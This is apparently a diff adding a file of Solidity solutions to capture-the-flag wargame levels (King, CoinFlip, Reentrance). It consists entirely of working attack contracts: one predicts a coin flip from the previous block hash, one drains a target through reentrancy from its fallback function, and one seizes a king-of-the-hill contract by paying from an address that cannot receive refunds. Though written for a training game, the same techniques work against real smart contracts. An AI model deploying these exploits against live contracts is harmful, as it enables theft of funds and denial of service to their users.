@@ -1,0 +1,69 @@
+#ch1 king
+pragma solidity ^0.8.0;
+
+contract King {
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+        levelInstance = _levelInstance;
+    }
+
+    function give() public payable {
+        levelInstance.call{value: msg.value}("");
+    }
+}
+
+
+#ch4 coinflip
+pragma solidity ^0.6.0;
+
+import './safemath.sol';
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract CoinFlip {
+    using SafeMath for uint256;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    address levelInstance;
+
+  constructor(address _levelInstance) public {
+      levelInstance = _levelInstance;
+  }
+
+  function guess() public {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+    if (side == true) {
+        ICoinFlip(levelInstance).flip(true);
+    } else {
+        ICoinFlip(levelInstance).flip(false);
+    }
+  }
+}
+
+#ch5 reentrancy
+
+pragma solidity ^0.8.0;
+
+interface IReentrance {
+    function withdraw(uint256 _amount) external;
+}
+
+contract Reentrance {
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+        levelInstance = _levelInstance;
+    }
+
+    function claim(uint256 _amount) public {
+        IReentrance(levelInstance).withdraw(_amount);
+    }
+
+    fallback() external payable {
+        IReentrance(levelInstance).withdraw(msg.value);
+    }
+}
